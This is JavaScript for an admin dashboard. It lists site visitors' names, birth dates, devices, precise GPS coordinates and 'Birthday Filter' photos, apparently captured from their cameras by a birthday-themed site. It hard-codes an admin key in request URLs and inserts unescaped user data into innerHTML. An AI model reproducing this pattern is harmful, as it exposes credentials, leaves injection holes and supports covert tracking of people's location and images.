// Load visitors from localStorage
function loadVisitors() {
    const visitors = JSON.parse(localStorage.getItem('websiteVisitors') || '[]');
    const tableBody = document.getElementById('visitorTableBody');
    const noData = document.getElementById('noData');
    
    // Clear table
    tableBody.innerHTML = '';
    
    if (visitors.length === 0) {
        noData.classList.add('show');
        updateDashboard(0, 0, '-');
        return;
    }
    
    noData.classList.remove('show');
    
    // Sort by visit date (newest first)
    visitors.sort((a, b) => new Date(b.visitDate) - new Date(a.visitDate));
    
    // Display visitors
    visitors.forEach(visitor => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${visitor.visitTime}</td>
            <td>${visitor.device}</td>
            <td>${visitor.browser}</td>
            <td>${visitor.latitude}</td>
            <td>${visitor.longitude}</td>
        `;
        tableBody.appendChild(row);
    });
    
    // Update dashboard
    const mobileCount = visitors.filter(v => v.isMobile).length;
    const lastVisit = visitors.length > 0 ? visitors[0].visitTime : '-';
    
    updateDashboard(visitors.length, mobileCount, lastVisit);
}

// Update dashboard cards
function updateDashboard(total, mobile, lastVisit, totalPhotos = 0) {
    document.getElementById('totalVisitors').textContent = total;
    document.getElementById('mobileUsers').textContent = mobile;
    document.getElementById('lastVisit').textContent = lastVisit;
    document.getElementById('totalPhotos').textContent = totalPhotos;
}

// Clear all data
function clearData() {
    if (confirm('Are you sure you want to clear all user data? This action cannot be undone.')) {
        localStorage.removeItem('websiteVisitors');
        localStorage.removeItem('allUsers');
        localStorage.removeItem('capturedPhotos');
        localStorage.removeItem('userEntered');
        localStorage.removeItem('userName');
        localStorage.removeItem('accessType');
        localStorage.removeItem('userBirthDate');
        loadAllUsers();
        loadPhotos();
        alert('All data has been cleared.');
    }
}

// Load photos from API and localStorage
async function loadPhotos() {
    const gallery = document.getElementById('photosGallery');
    const noPhotosData = document.getElementById('noPhotosData');
    
    gallery.innerHTML = '';
    
    try {
        // Get visitors data from localStorage
        const visitorsData = localStorage.getItem('websiteVisitors') || '[]';
        
        // Get photos from localStorage
        const photosData = localStorage.getItem('capturedPhotos') || '[]';
        
        // Fetch data from API (with admin key)
        try {
            const response = await fetch(`/api/getVisitors?key=kimiry@123&visitors=${encodeURIComponent(visitorsData)}&photos=${encodeURIComponent(photosData)}`);
            
            if (response.ok) {
                const contentType = response.headers.get('content-type');
                if (contentType && contentType.includes('application/json')) {
                    const data = await response.json();
                    const photos = data.photos || [];
                    
                    // Also check localStorage for photos (client-side backup)
                    const localPhotos = JSON.parse(localStorage.getItem('capturedPhotos') || '[]');
                    
                    // Combine server and local photos
                    const allPhotos = [...photos, ...localPhotos];
                    
                    // Remove duplicates based on ID
                    const uniquePhotos = Array.from(
                        new Map(allPhotos.map(photo => [photo.id || photo.timestamp, photo])).values()
                    );
                    
                    if (uniquePhotos.length === 0) {
                        noPhotosData.classList.add('show');
                        return;
                    }
                    
                    noPhotosData.classList.remove('show');
                    
                    // Sort by timestamp (newest first)
                    uniquePhotos.sort((a, b) => new Date(b.timestamp || b.createdAt) - new Date(a.timestamp || a.createdAt));
                    
                    // Display photos
                    uniquePhotos.forEach(photo => {
                        const photoCard = document.createElement('div');
                        photoCard.className = 'photo-card';
                        
                        const visitTime = photo.visitTime || new Date(photo.timestamp || photo.createdAt).toLocaleString();
                        const location = photo.location 
                            ? `${photo.location.latitude.toFixed(4)}, ${photo.location.longitude.toFixed(4)}`
                            : 'Not available';
                        const device = photo.device?.userAgent || 'Unknown device';
                        
                        photoCard.innerHTML = `
                            <img src="${photo.image}" alt="Birthday Filter Photo" onclick="openPhotoModal('${photo.image}')">
                            <div class="photo-info">
                                <p><strong>Time:</strong> ${visitTime}</p>
                                <p><strong>Location:</strong> ${location}</p>
                                <p><strong>Device:</strong> ${device.substring(0, 50)}...</p>
                            </div>
                        `;
                        
                        gallery.appendChild(photoCard);
                    });
                    
                    // Update photo count
                    const totalPhotos = uniquePhotos.length;
                    document.getElementById('totalPhotos').textContent = totalPhotos;
                    updateDashboard(
                        JSON.parse(visitorsData).length,
                        JSON.parse(visitorsData).filter(v => v.isMobile).length,
                        JSON.parse(visitorsData).length > 0 ? JSON.parse(visitorsData)[0].visitTime : '-',
                        totalPhotos
                    );
                } else {
                    // Response is not JSON, use localStorage
                    throw new Error('API returned non-JSON response');
                }
            } else {
                // If API fails, try localStorage only
                throw new Error('API request failed');
            }
        } catch (error) {
            console.error('Error loading photos from API:', error);
            // If API fails, try localStorage only
            const localPhotos = JSON.parse(localStorage.getItem('capturedPhotos') || '[]');
            
            if (localPhotos.length === 0) {
                noPhotosData.classList.add('show');
                return;
            }
            
            noPhotosData.classList.remove('show');
            
            localPhotos.forEach(photo => {
                const photoCard = document.createElement('div');
                photoCard.className = 'photo-card';
                
                const visitTime = photo.visitTime || new Date(photo.timestamp).toLocaleString();
                const location = photo.location 
                    ? `${photo.location.latitude.toFixed(4)}, ${photo.location.longitude.toFixed(4)}`
                    : 'Not available';
                
                photoCard.innerHTML = `
                    <img src="${photo.image}" alt="Birthday Filter Photo" onclick="openPhotoModal('${photo.image}')">
                    <div class="photo-info">
                        <p><strong>Time:</strong> ${visitTime}</p>
                        <p><strong>Location:</strong> ${location}</p>
                    </div>
                `;
                
                gallery.appendChild(photoCard);
            });
        }
        
    } catch (error) {
        console.error('Error loading photos:', error);
        noPhotosData.classList.add('show');
    }
}

// Open photo in modal (full screen)
function openPhotoModal(imageSrc) {
    const modal = document.createElement('div');
    modal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.9);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 10000;
        cursor: pointer;
    `;
    
    const img = document.createElement('img');
    img.src = imageSrc;
    img.style.cssText = `
        max-width: 90%;
        max-height: 90%;
        border-radius: 10px;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
    `;
    
    modal.appendChild(img);
    document.body.appendChild(modal);
    
    modal.addEventListener('click', () => {
        document.body.removeChild(modal);
    });
}

// Load all users (main site + birthday site)
async function loadAllUsers() {
    try {
        // Get users data from localStorage
        const usersData = localStorage.getItem('allUsers') || '[]';
        
        // Fetch from API (with admin key)
        let allUsers = [];
        
        try {
            const response = await fetch(`/api/getAllUsers?key=kimiry@123&users=${encodeURIComponent(usersData)}`);
            
            if (response.ok) {
                const contentType = response.headers.get('content-type');
                if (contentType && contentType.includes('application/json')) {
                    const data = await response.json();
                    allUsers = data.allUsers || [];
                } else {
                    // Response is not JSON, use localStorage
                    allUsers = JSON.parse(usersData);
                }
            } else {
                // If API fails, use localStorage
                allUsers = JSON.parse(usersData);
            }
        } catch (fetchError) {
            console.error('Error fetching from API:', fetchError);
            // If API fails, use localStorage
            allUsers = JSON.parse(usersData);
        }
        
        // Separate users by access type
        const mainSiteUsers = allUsers.filter(u => u.accessType === 'Main Site (Anshu)');
        const birthdaySiteUsers = allUsers.filter(u => u.accessType === 'Birthday Site');
        
        // Update dashboard
        document.getElementById('mainSiteUsers').textContent = mainSiteUsers.length;
        document.getElementById('birthdaySiteUsers').textContent = birthdaySiteUsers.length;
        document.getElementById('totalVisitors').textContent = allUsers.length;
        
        // Display main site users
        displayMainSiteUsers(mainSiteUsers);
        
        // Display birthday site users
        displayBirthdaySiteUsers(birthdaySiteUsers);
        
    } catch (error) {
        console.error('Error loading users:', error);
        // Fallback to localStorage
        const usersData = localStorage.getItem('allUsers') || '[]';
        const allUsers = JSON.parse(usersData);
        const mainSiteUsers = allUsers.filter(u => u.accessType === 'Main Site (Anshu)');
        const birthdaySiteUsers = allUsers.filter(u => u.accessType === 'Birthday Site');
        
        displayMainSiteUsers(mainSiteUsers);
        displayBirthdaySiteUsers(birthdaySiteUsers);
    }
}

// Display main site users
function displayMainSiteUsers(users) {
    const tableBody = document.getElementById('mainSiteTableBody');
    const noData = document.getElementById('noMainSiteData');
    
    tableBody.innerHTML = '';
    
    if (users.length === 0) {
        noData.classList.add('show');
        return;
    }
    
    noData.classList.remove('show');
    
    // Sort by visit date (newest first)
    users.sort((a, b) => new Date(b.visitDate || b.timestamp) - new Date(a.visitDate || a.timestamp));
    
    users.forEach(user => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td><strong>${user.name}</strong></td>
            <td>${user.visitTime || new Date(user.timestamp).toLocaleString()}</td>
            <td>${user.device?.device || 'Unknown'}</td>
            <td>${user.device?.browser || 'Unknown'}</td>
            <td>${user.location?.latitude?.toFixed(4) || 'N/A'}</td>
            <td>${user.location?.longitude?.toFixed(4) || 'N/A'}</td>
        `;
        tableBody.appendChild(row);
    });
}

// Display birthday site users
function displayBirthdaySiteUsers(users) {
    const tableBody = document.getElementById('birthdaySiteTableBody');
    const noData = document.getElementById('noBirthdaySiteData');
    
    tableBody.innerHTML = '';
    
    if (users.length === 0) {
        noData.classList.add('show');
        return;
    }
    
    noData.classList.remove('show');
    
    // Sort by visit date (newest first)
    users.sort((a, b) => new Date(b.visitDate || b.timestamp) - new Date(a.visitDate || a.timestamp));
    
    users.forEach(user => {
        const birthDate = user.birthDate ? new Date(user.birthDate).toLocaleDateString() : 'N/A';
        const targetDate = user.targetDate ? new Date(user.targetDate).toLocaleDateString() : 'N/A';
        
        const row = document.createElement('tr');
        row.innerHTML = `
            <td><strong>${user.name}</strong></td>
            <td>${birthDate}</td>
            <td>${targetDate}</td>
            <td>${user.visitTime || new Date(user.timestamp).toLocaleString()}</td>
            <td>${user.device?.device || 'Unknown'}</td>
            <td>${user.device?.browser || 'Unknown'}</td>
            <td>${user.location?.latitude?.toFixed(4) || 'N/A'}</td>
            <td>${user.location?.longitude?.toFixed(4) || 'N/A'}</td>
        `;
        tableBody.appendChild(row);
    });
}

// Load visitors on page load
window.addEventListener('load', function() {
    loadAllUsers();
    loadPhotos();
});
